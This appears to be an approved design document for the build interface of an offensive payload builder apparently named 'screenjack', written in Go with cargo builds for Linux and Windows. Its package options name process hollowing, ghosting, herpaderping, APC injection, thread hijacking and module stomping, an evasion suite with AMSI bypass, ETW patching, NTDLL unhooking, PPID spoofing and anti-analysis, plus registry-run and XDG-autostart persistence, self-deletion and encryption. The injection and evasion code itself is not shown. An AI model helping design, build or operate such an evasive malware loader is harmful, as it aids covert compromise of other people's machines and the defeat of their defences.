# Unified Build System Design

**Date:** 2026-07-31  
**Status:** Approved  
**Scope:** TUI build system with conditional platform packaging

## Overview

Replace separate Build/Package tab workflows with a unified "b" keybind that builds selected targets with Package tab options applied conditionally based on platform.

## Decision Tree

```
"b" pressed
│
├─ VALIDATE FIRST (fail fast):
│   ├─ No targets selected → "Select at least one target"
│   ├─ Platform-specific options + no matching target:
│   │   └─ "Add [Platform] target? [y/n]"
│   │       ├─ y → Add target, continue
│   │       └─ n → Warn "Skipping: [list]", continue
│   └─ No asset selected + embed mode → "Select an asset first"
│
├─ QUEUE CHECK:
│   ├─ Build in progress → Auto-queue (replace any existing queued)
│   │   └─ Status: "Queued (1 ahead)"
│   └─ No build → Start immediately
│
├─ BUILD (parallel per target):
│   ├─ LINUX:
│   │   ├─ cargo build --release [--features embedded]
│   │   ├─ Apply: XDG persistence (flag), Encrypt
│   │   └─ Report: ✓ Linux or ✗ Linux: <error>
│   │
│   └─ WINDOWS:
│       ├─ cargo build --release --target x86_64-pc-windows-gnu
│       ├─ Apply: Execution method, Evasion suite, Persistence, Encrypt
│       └─ Report: ✓ Windows or ✗ Windows: <error>
│
└─ FINAL STATUS:
    ├─ All success → "Build complete: Linux ✓, Windows ✓"
    ├─ Partial → "Build partial: Linux ✓, Windows ✗"
    └─ All fail → "Build failed"

Cancel: "c" key → Cancels current build + clears queue
```

## State Model

```go
type BuildState int
const (
    BuildIdle BuildState = iota
    BuildRunning
    BuildCancelling
)

type BuildJob struct {
    Targets     []string          // ["linux", "windows"]
    Asset       string            // selected asset path
    EmbedAsset  bool              // true = embed, false = HTTP fetch
    PkgConfig   PackageConfig     // snapshot from Package tab
    StartedAt   time.Time
}

type TargetProgress struct {
    Target      string            // "linux" or "windows"
    Phase       string            // "compiling", "packaging", "encrypting"
    Done        bool
    Error       string            // empty if success
}
```

**TUIModel additions:**
```go
buildState    BuildState
currentBuild  *BuildJob
queuedBuild   *BuildJob        // max 1 queued, newest wins
buildProgress []TargetProgress
buildLog      []string         // capped at ~100 lines
logExpanded   bool             // "l" toggles
embedAsset    bool             // true = embed in binary, false = HTTP fetch
progressChan  chan TargetProgress
logChan       chan string
doneChan      chan BuildDoneMsg
```

## Keybindings

| Key | Action |
|-----|--------|
| b | Unified build (validate, queue if busy) |
| c | Cancel current build + clear queue |
| l | Toggle log panel expand/collapse |

Existing keybindings unchanged.

## UI Layout

**Build Progress Panel:**
```
┌─ Build Progress ──────────────────────────────────┐
│  Linux     [████████████████████----]  Packaging  │
│  Windows   [████████------]  Compiling            │
│                                                   │
│  ▸ Log (l to expand)                              │
│    cargo build --release ...                      │
└───────────────────────────────────────────────────┘
```

**Expanded log:**
```
┌─ Build Progress ──────────────────────────────────┐
│  Linux     [████████████████████████]  ✓ Done     │
│  Windows   [████████████████--------]  Encrypting │
│                                                   │
│  ▾ Log (l to collapse)                            │
│    cargo build --release --target x86_64-pc-win...│
│       Compiling screenjack v0.1.0                 │
│       Finished release [optimized] target(s)     │
│    [*] Applying AMSI bypass...                    │
│    [*] Running encryption...                      │
└───────────────────────────────────────────────────┘
```

**Status bar states:**
- `Ready`
- `Building: Linux ▸▸, Windows ▸`
- `Queued [1]`
- `✓ Linux ✓ Windows`
- `✓ Linux ✗ Windows`

## Channel Architecture

```
TUI Update() ←─────────────────────────────────────┐
    │                                              │
    ├─ "b" → validate → startBuild()              │
    ├─ "c" → cancelBuild()                        │
    ├─ ProgressMsg → update buildProgress[]       │
    ├─ LogMsg → append buildLog[]                 │
    └─ BuildDoneMsg → BuildIdle, pop queue        │
                                                   │
Build Orchestrator ────────────────────────────────┤
    go func() {                                    │
        ctx, cancel := context.WithCancel(...)     │
        for _, target := range job.Targets {       │
            wg.Add(1)                              │
            go buildTarget(ctx, target, ...)       │
        }                                          │
        wg.Wait()                                  │
        doneCh <- BuildDoneMsg{results}            │
    }()                                            │
                                                   │
buildTarget() ─────────────────────────────────────┘
    progressCh <- TargetProgress{...}
    exec.CommandContext(ctx, "cargo", ...)
    logCh <- "Compiling..."
```

**Channel → tea.Msg bridge:**
```go
func (m TUIModel) listenForBuildUpdates() tea.Cmd {
    return func() tea.Msg {
        select {
        case p := <-m.progressChan:
            return progressMsg(p)
        case l := <-m.logChan:
            return logMsg(l)
        case d := <-m.doneChan:
            return buildDoneMsg(d)
        }
    }
}
```

## Platform-Conditional Options

```go
const (
    PlatWin = 1 << 0
    PlatLin = 1 << 1
    PlatAll = PlatWin | PlatLin
)

var execMethodPlatform = map[int]int{
    0: PlatAll,  // Raw Binary
    1: PlatWin,  // Process Ghosting
    2: PlatWin,  // Process Hollowing
    3: PlatWin,  // Process Herpaderping
    4: PlatWin,  // APC Injection
    5: PlatWin,  // Thread Hijacking
    6: PlatWin,  // Threadless Injection
    7: PlatWin,  // Module Stomping
}

var evasionPlatform = map[int]int{
    0: PlatWin,  // AMSI Bypass
    1: PlatWin,  // ETW Patch
    2: PlatWin,  // NTDLL Unhook
    3: PlatWin,  // PPID Spoof
    4: PlatWin,  // Block DLL Policy
    5: PlatWin,  // Anti-Debug
    6: PlatWin,  // Anti-Analysis
    7: PlatWin,  // Direct Syscalls
}

var persistPlatform = map[int]int{
    0: PlatAll,  // None
    1: PlatWin,  // Registry Run
    2: PlatLin,  // XDG Autostart
    3: PlatWin,  // Self-Delete
}

var encryptPlatform = PlatAll
```

**Filter at build time:**
```go
func (job *BuildJob) optionsForTarget(target string) FilteredOptions {
    plat := PlatLin
    if target == "windows" { plat = PlatWin }
    
    return FilteredOptions{
        ExecMethod: filterIf(job.PkgConfig.ExecMethod, execMethodPlatform, plat),
        Evasion:    filterSlice(job.PkgConfig.Evasion, evasionPlatform, plat),
        Persist:    filterIf(job.PkgConfig.PersistMethod, persistPlatform, plat),
        Encrypt:    job.PkgConfig.Encrypt,
    }
}
```

**Validation helpers:**
```go
func (cfg *PackageConfig) requiresWindows() bool {
    if execMethodPlatform[cfg.ExecMethod] == PlatWin { return true }
    for i, on := range cfg.Evasion {
        if on && evasionPlatform[i] == PlatWin { return true }
    }
    if cfg.PersistMethod == 1 || cfg.PersistMethod == 3 { return true }
    return false
}

func (cfg *PackageConfig) requiresLinux() bool {
    return cfg.PersistMethod == 2
}
```

## Edge Cases

| Case | Behavior |
|------|----------|
| No targets selected | Block: "Select at least one target" |
| No asset + embed mode | Block: "Select an asset first" |
| Win options + no Win target | Prompt to add, or warn+skip |
| Lin options + no Lin target | Prompt to add, or warn+skip |
| "b" while building | Auto-queue, replace existing queue |
| "b" spam | Only 1 queued, newest wins |
| "c" while building | Cancel current + clear queue |
| "c" while idle | No-op |
| Partial failure | Report per-target status |
| Options change while queued | Queued job has snapshot at queue time |
| Quit while building | Cancel builds, then quit |

## Out of Scope

- Multiple queue slots
- Build history/replay
- Remote build dispatch
- Per-target option overrides in UI

## Implementation Tasks

1. Add BuildState, BuildJob, TargetProgress types to tui.go
2. Add build channels and state fields to TUIModel
3. Implement validation logic with smart suggestions
4. Implement build orchestrator goroutine
5. Implement per-target build function with platform filtering
6. Add progress bar rendering
7. Add collapsible log panel
8. Add "b", "c" keybindings to Update()
9. Wire up channel → tea.Msg bridge
10. Update status bar rendering
